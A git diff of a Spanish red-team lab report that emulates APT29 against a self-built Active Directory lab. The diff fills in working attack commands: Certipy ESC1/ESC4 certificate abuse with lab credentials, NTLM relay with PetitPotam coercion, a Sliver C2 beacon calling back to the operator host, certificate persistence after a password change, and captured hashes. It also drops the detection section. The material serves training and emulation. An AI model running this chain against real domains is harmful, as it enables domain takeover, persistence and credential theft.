@@ -9,26 +9,24 @@
 |-------|---------|
 | **Nombre en clave** | DARK GATE |
 | **Fecha de inicio** | 16/05/2026 |
+| **Fecha de fin** | 17/05/2026 |
 | **Operador** | Adrián Camacho |
 | **Adversario simulado** | APT29 (Cozy Bear) |
 | **Framework** | MITRE ATT&CK v14 — Enterprise |
-| **Metodología C2** | Sliver (post-explotación) |
+| **C2** | Sliver v1.7.3 |
 | **Objetivo primario** | Domain Admin via ADCS Abuse (ESC1/ESC4/ESC8) |
 | **Objetivo secundario** | Persistencia via certificado de Administrador |
 | **Entorno** | Lab propio — DC-01 reutilizado (atackcorp.local) |
 | **Herramienta principal** | Certipy v5.0.4 |
+| **Estado** | ✅ Completado |
 
 ---
 
 ## 🕵️ Perfil del Adversario — APT29 (Cozy Bear)
 
-APT29 es un grupo de amenaza persistente avanzada atribuido al SVR ruso. Sus campañas más recientes (2021-2024) incluyen el abuso sistemático de Active Directory Certificate Services como vector de escalada de privilegios y persistencia a largo plazo. El abuso de ADCS es especialmente valioso para APT29 porque los certificados tienen una validez de meses o años, proporcionando acceso persistente incluso tras rotación de contraseñas.
+APT29 es un grupo de amenaza persistente avanzada atribuido al SVR ruso. Sus campañas más recientes (2021-2024) incluyen el abuso sistemático de Active Directory Certificate Services como vector de escalada de privilegios y persistencia a largo plazo. Los certificados tienen validez de meses o años — acceso persistente incluso tras rotación de contraseñas.
 
-### TTPs de referencia (MITRE)
-- [G0016 — APT29](https://attack.mitre.org/groups/G0016/)
-- T1649 — Steal or Forge Authentication Certificates
-- T1557 — Adversary-in-the-Middle (ESC8)
-- T1078 — Valid Accounts
+**TTPs de referencia:** [G0016 — APT29](https://attack.mitre.org/groups/G0016/)
 
 ---
 
@@ -40,191 +38,144 @@ APT29 es un grupo de amenaza persistente avanzada atribuido al SVR ruso. Sus cam
 │               Segmento: 10.0.2.0/24                 │
 │                                                     │
 │   ┌─────────────────────────────────────────────┐   │
-│   │            DC-01 (Windows Server 2022)      │   │
-│   │            10.0.2.10                        │   │
-│   │            atackcorp.local                  │   │
-│   │            ADCS: AtackCorp-CA               │   │
-│   │            IIS: http://10.0.2.10/certsrv/  │   │
+│   │         DC-01 (Windows Server 2022)         │   │
+│   │         10.0.2.10 — atackcorp.local         │   │
+│   │         ADCS: AtackCorp-CA                  │   │
+│   │         IIS: http://10.0.2.10/certsrv/     │   │
 │   └─────────────────────────────────────────────┘   │
 │                        ▲                            │
-│                        │                            │
 │   ┌────────────────────┴────────────────────────┐   │
-│   │                  Kali Linux                 │   │
-│   │               10.0.2.9 (fijo)               │   │
-│   │           Certipy v5.0.4                    │   │
-│   │           Impacket (ntlmrelayx)             │   │
+│   │   Kali 10.0.2.9 — Certipy | Sliver C2      │   │
 │   └─────────────────────────────────────────────┘   │
 └─────────────────────────────────────────────────────┘
 ```
-
-### Máquinas del entorno
-
-| Host | SO | IP | Rol |
-|------|----|----|-----|
-| DC-01 | Windows Server 2022 | `10.0.2.10` | DC + ADCS AtackCorp-CA |
-| Kali | Kali Linux 2026.1 | `10.0.2.9` | Máquina operadora APT29 |
 
 ---
 
 ## 🔐 Vulnerabilidades ADCS Configuradas
 
-### ESC1 — Enrollee Supplies Subject
-**Plantilla:** `VulnerableUser`  
-**Condición:** `msPKI-Certificate-Name-Flag = 1` (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)  
-**Impacto:** Cualquier usuario del dominio puede solicitar un certificado con un UPN arbitrario (incluido `administrator@atackcorp.local`) y usarlo para obtener un TGT como ese usuario.
-
-| Atributo | Valor |
-|---------|-------|
-| `msPKI-Certificate-Name-Flag` | `1` (EnrolleeSuppliesSubject) |
-| `msPKI-Enrollment-Flag` | `0` (sin aprobación) |
-| Extended Key Usage | Client Authentication ✅ |
-| Enrollment Rights | `ATACKCORP\Usuarios del dominio` |
-| OID | `1.3.6.1.4.1.311.21.8.3242212.7457772` |
-
-### ESC4 — Escritura sobre plantilla
-**Usuario:** `fin.garcia`  
-**Permiso:** `GenericWrite` sobre la plantilla `VulnerableUser`  
-**Impacto:** `fin.garcia` puede modificar los atributos de la plantilla — por ejemplo habilitar `EnrolleeSuppliesSubject` en cualquier plantilla que no lo tenga, convirtiéndola en ESC1.
-
-### ESC8 — NTLM Relay to ADCS HTTP
-**Endpoint:** `http://10.0.2.10/certsrv/`  
-**Condición:** Web Enrollment habilitado sobre HTTP (sin HTTPS)  
-**Impacto:** Capturar autenticación NTLM de cualquier equipo y relayarla hacia `/certsrv/certfnsh.asp` para obtener un certificado en nombre de ese equipo. Si se captura la auth del DC, se obtiene un certificado del DC → Pass-the-Certificate → Domain Admin.
+| ESC | Tipo | Condición | Usuario |
+|-----|------|-----------|---------|
+| **ESC1** | Enrollee Supplies Subject | `msPKI-Certificate-Name-Flag = 1` en `VulnerableUser` | Domain Users |
+| **ESC4** | Write Permissions on Template | `fin.garcia` tiene `GenericWrite + WriteDacl` | fin.garcia |
+| **ESC8** | NTLM Relay to HTTP | Web Enrollment HTTP en `/certsrv/` | Cualquier equipo |
 
 ---
 
-## 🗺️ Plan de Operación — Fases
+## 🗺️ Fases Completadas
 
-### FASE 1 — Reconnaissance ✅ COMPLETADA
-**Táctica MITRE:** TA0007 — Discovery  
-**Herramienta:** Certipy v5.0.4
-
-| # | Técnica | Herramienta | Estado |
-|---|---------|-------------|--------|
-| 1.1 | ADCS Enumeration | `certipy-ad find` | ✅ |
-| 1.2 | CA Configuration | Certipy stdout | ✅ |
-| 1.3 | Vulnerable Templates | ESC1/ESC8 detectados | ✅ |
-
-**Hallazgos confirmados:**
-- `AtackCorp-CA` — Enterprise Root CA activa
-- Plantilla `VulnerableUser` → **ESC1** confirmado por Certipy
-- Web Enrollment HTTP → **ESC8** confirmado por Certipy
+### FASE 1 — Reconnaissance ✅
+```bash
+certipy-ad find -u ceo.martinez@atackcorp.local -p 'Direccion2024!' \
+  -dc-ip 10.0.2.10 -stdout
+```
+- ESC1 confirmado en `VulnerableUser` ✅
+- ESC8 confirmado — Web Enrollment HTTP ✅
 
 ---
 
-### FASE 2 — ESC1 Exploitation
-**Táctica MITRE:** TA0006 — Credential Access  
-**Técnica:** T1649 — Steal or Forge Authentication Certificates
+### FASE 2 — ESC1 Exploitation ✅
+```bash
+certipy-ad req -u ceo.martinez@atackcorp.local -p 'Direccion2024!' \
+  -ca AtackCorp-CA -template VulnerableUser \
+  -upn Administrador@atackcorp.local -dc-ip 10.0.2.10
 
-| # | Paso | Comando | Estado |
-|---|------|---------|--------|
-| 2.1 | Solicitar cert como administrator | `certipy-ad req -upn administrator@atackcorp.local` | ⏳ |
-| 2.2 | Autenticar con el certificado | `certipy-ad auth -pfx administrator.pfx` | ⏳ |
-| 2.3 | Obtener TGT + hash NTLM | Salida de certipy auth | ⏳ |
-| 2.4 | Pass-the-Hash → shell DA | `impacket-psexec / evil-winrm` | ⏳ |
+certipy-ad auth -pfx administrador.pfx -dc-ip 10.0.2.10 -domain atackcorp.local
+```
+**Hash:** `b73fdfe10e87b4ca5c0d957f81de6863` → shell DA ✅
 
-**Criterio de éxito:** Hash NTLM del Administrador obtenido. Shell como DA.
-
----
-
-### FASE 3 — ESC4 Exploitation
-**Táctica MITRE:** TA0004 — Privilege Escalation  
-**Técnica:** T1222 + T1649
-
-| # | Paso | Comando | Estado |
-|---|------|---------|--------|
-| 3.1 | Guardar estado original de la plantilla | `certipy-ad template -save-old` | ⏳ |
-| 3.2 | Modificar plantilla con fin.garcia | `certipy-ad template -template VulnerableUser` | ⏳ |
-| 3.3 | Explotar ESC1 sobre plantilla modificada | `certipy-ad req` | ⏳ |
-| 3.4 | Restaurar plantilla | `certipy-ad template -configuration <saved>` | ⏳ |
-
-**Criterio de éxito:** Domain Admin via modificación de plantilla con usuario de bajo privilegio.
+> **Nota:** UPN debe ser `Administrador` (mayúscula) — dominio en español.
 
 ---
 
-### FASE 4 — ESC8 Exploitation (NTLM Relay)
-**Táctica MITRE:** TA0001 — Initial Access / TA0006 — Credential Access  
-**Técnica:** T1557.001 — NTLM Relay
+### FASE 3 — ESC4 Exploitation ✅
+```bash
+# Guardar backup → modificar → explotar → restaurar (OPSEC)
+certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
+  -dc-ip 10.0.2.10 -template VulnerableUser -save-configuration VulnerableUser_backup.json
 
-| # | Paso | Comando | Estado |
-|---|------|---------|--------|
-| 4.1 | Iniciar relay hacia certsrv | `certipy-ad relay -target http://10.0.2.10` | ⏳ |
-| 4.2 | Forzar autenticación NTLM | `impacket-printerbug / PetitPotam` | ⏳ |
-| 4.3 | Obtener certificado del DC | Relay exitoso → .pfx | ⏳ |
-| 4.4 | Autenticar como DC$ | `certipy-ad auth` | ⏳ |
-| 4.5 | DCSync → Domain Admin | `impacket-secretsdump` | ⏳ |
+certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
+  -dc-ip 10.0.2.10 -template VulnerableUser -write-default-configuration -force
 
-**Criterio de éxito:** Certificado del DC obtenido via relay → DCSync → hashes de dominio.
+certipy-ad req -u fin.garcia@atackcorp.local -p 'Finance2024!' \
+  -ca AtackCorp-CA -template VulnerableUser \
+  -upn Administrador@atackcorp.local -dc-ip 10.0.2.10 -out administrador_esc4
 
----
+certipy-ad template -u fin.garcia@atackcorp.local -p 'Finance2024!' \
+  -dc-ip 10.0.2.10 -template VulnerableUser \
+  -write-configuration VulnerableUser_backup.json -force
+```
+**Cert:** `administrador_esc4.pfx` + plantilla restaurada ✅
 
-### FASE 5 — C2 Establishment
-**Táctica MITRE:** TA0011 — Command and Control
-
-| # | Paso | Herramienta | Estado |
-|---|------|-------------|--------|
-| 5.1 | Generar beacon Sliver | `generate beacon --http 10.0.2.9:443` | ⏳ |
-| 5.2 | Transferir a DC-01 | Evil-WinRM upload | ⏳ |
-| 5.3 | Ejecutar beacon | `Start-Process -WindowStyle Hidden` | ⏳ |
-| 5.4 | Beacon activo | Sliver console | ⏳ |
+> **Nota Certipy v5:** Requiere `WriteDacl + WriteProperty` además de `GenericWrite`.
 
 ---
 
-### FASE 6 — Persistence via Certificado
-**Táctica MITRE:** TA0003 — Persistence  
-**Técnica:** T1649 — Certificate persistence
+### FASE 4 — ESC8 NTLM Relay ✅ Identificado / ⚠️ Bloqueado KB5005413
+```bash
+sudo impacket-ntlmrelayx -t http://10.0.2.10/certsrv/certfnsh.asp \
+  --adcs --template DomainController -smb2support
 
-| # | Paso | Herramienta | Estado |
-|---|------|-------------|--------|
-| 6.1 | Solicitar cert con validez larga | `certipy-ad req` | ⏳ |
-| 6.2 | Almacenar PFX fuera del dominio | Exportar .pfx | ⏳ |
-| 6.3 | Demostrar persistencia post-rotación | `certipy-ad auth` tras cambio de pwd | ⏳ |
-| 6.4 | Credential dump final | `impacket-secretsdump` | ⏳ |
-
-**Criterio de éxito:** El certificado permite autenticarse incluso tras rotación de contraseñas.
+python3 /opt/redteam/PetitPotam.py -u ceo.martinez -p 'Direccion2024!' \
+  -d atackcorp.local -pipe all 10.0.2.9 10.0.2.10
+```
+**PetitPotam:** `Attack worked!` ✅  
+**Relay:** bloqueado por KB5005413 (WS2022) — documentado como comportamiento real ✅
 
 ---
 
-## 📸 Capturas por Fase
-
-| Fase | Archivo | Descripción | Estado |
-|------|---------|-------------|--------|
-| 1 | `fase1-01-certipy-find.png` | Certipy detect ESC1 + ESC8 | ⏳ |
-| 1 | `fase1-02-ca-config.png` | Configuración CA AtackCorp | ⏳ |
-| 2 | `fase2-01-esc1-cert-request.png` | Cert solicitado como administrator | ⏳ |
-| 2 | `fase2-02-esc1-auth-tgt.png` | TGT + hash NTLM obtenidos | ⏳ |
-| 2 | `fase2-03-da-shell.png` | Shell como Domain Admin | ⏳ |
-| 3 | `fase3-01-esc4-template-modify.png` | fin.garcia modifica plantilla | ⏳ |
-| 3 | `fase3-02-esc4-cert-obtained.png` | Cert obtenido via ESC4 | ⏳ |
-| 4 | `fase4-01-esc8-relay-setup.png` | ntlmrelayx configurado | ⏳ |
-| 4 | `fase4-02-esc8-cert-captured.png` | Cert DC obtenido via relay | ⏳ |
-| 4 | `fase4-03-esc8-dcsync.png` | DCSync via cert DC | ⏳ |
-| 5 | `fase5-01-sliver-beacon.png` | Beacon activo en DC-01 | ⏳ |
-| 6 | `fase6-01-cert-persistence.png` | Persistencia via certificado | ⏳ |
-| 6 | `fase6-02-objective-proof.png` | Prueba final de compromiso | ⏳ |
+### FASE 5 — C2 Establishment ✅
+```
+generate beacon --http 10.0.2.9:443 --os windows --arch amd64 \
+  --format exe --seconds 60 --jitter 15 --save /tmp/beacon_dc01.exe
+```
+**Beacon:** `CLINICAL_CHAIRMAN` (4d1146b0) — DC-01 / ATACKCORP\Administrador ✅  
+**Tres beacons activos:** EASY_PROFIT (Lab-01) + SUDDEN_COMMUNICATION (Lab-02) + CLINICAL_CHAIRMAN (Lab-03) ✅
 
 ---
 
-## 🛡️ Notas Operacionales (OPSEC APT29)
-
-1. **Certipy genera mucho ruido en logs** — cada solicitud de certificado genera Event ID 4886 en el DC. En operaciones reales, espaciar las solicitudes.
-2. **ESC8 requiere que SMB signing esté deshabilitado o que el relay sea hacia HTTP** — el endpoint `/certsrv/` no requiere signing.
-3. **Los certificados persisten** — aunque se cambie la contraseña del Administrador, el certificado sigue siendo válido hasta su expiración. Es la técnica de persistencia más silenciosa en AD.
-4. **PetitPotam / PrinterBug** — para ESC8 necesitamos forzar autenticación del DC. PetitPotam funciona sin autenticación en WS2022 si no está parcheado.
-
----
-
-## 🔵 Detección (Blue Team)
-
-| Indicador | Log | Event ID |
-|-----------|-----|----------|
-| Solicitud de certificado con SAN arbitrario | CA logs | 4886 + 4887 |
-| Certificado emitido con UPN de Administrador | CA logs | 4887 |
-| Autenticación Kerberos con certificado | DC Security | 4768 (PKINIT) |
-| NTLM relay detectado | Network | IDS alert |
-| Modificación de plantilla de certificado | DC Security | 4899 |
+### FASE 6 — Certificate Persistence ✅
+```bash
+net user Administrador "NuevaPassword2026!"  # rotación de contraseña
+certipy-ad auth -pfx administrador.pfx -dc-ip 10.0.2.10 -domain atackcorp.local
+# → hash bc3abc2e0673a58e9e559d415b56d69d — certificado sigue válido ✅
+```
 
 ---
 
-*Operación DARK GATE — Adrián Camacho | Mayo 2026*  
-*Entorno de laboratorio — Únicamente con fines educativos*
+## 📸 Capturas
+
+| Fase | Archivo | Estado |
+|------|---------|--------|
+| 1 | `fase1-01-certipy-find-esc8.png` | ✅ |
+| 1 | `fase1-02-certipy-find-esc1.png` | ✅ |
+| 2 | `fase2-01-esc1-cert-request.png` | ✅ |
+| 2 | `fase2-02-esc1-auth-tgt.png` | ✅ |
+| 2 | `fase2-03-da-shell.png` | ✅ |
+| 3 | `fase3-01-esc4-template-modify.png` | ✅ |
+| 3 | `fase3-02-esc4-cert-obtained.png` | ✅ |
+| 3 | `fase3-03-esc4-template-restored.png` | ✅ |
+| 4 | `fase4-01-esc8-iis-hardening-bypass.png` | ✅ |
+| 4 | `fase4-02-esc8-ntlm-level-config.png` | ✅ |
+| 4 | `fase4-03-esc8-ws2022-mitigated.png` | ✅ |
+| 5 | `fase5-01-beacon-upload-exec.png` | ✅ |
+| 5 | `fase5-02-sliver-beacon-dc01.png` | ✅ |
+| 5 | `fase5-03-sliver-all-beacons.png` | ✅ |
+| 5 | `fase5-04-sliver-session-active.png` | ✅ |
+| 6 | `fase6-01-cert-persistence.png` | ✅ |
+| 6 | `fase6-02-password-rotation.png` | ✅ |
+| 6 | `fase6-03-cert-persistence-post-rotation.png` | ✅ |
+| 6 | `fase6-04-objective-proof.png` | ✅ |
+
+---
+
+## 💡 Lecciones clave
+
+- UPN en español: `Administrador` no `administrator`
+- Certipy v5 requiere `WriteDacl` además de `GenericWrite` para ESC4
+- ESC8 relay bloqueado en WS2022 por KB5005413
+- Certificados persisten tras rotación de contraseñas
+
+---
+
+*Operación DARK GATE — Adrián Camacho | Mayo 2026*
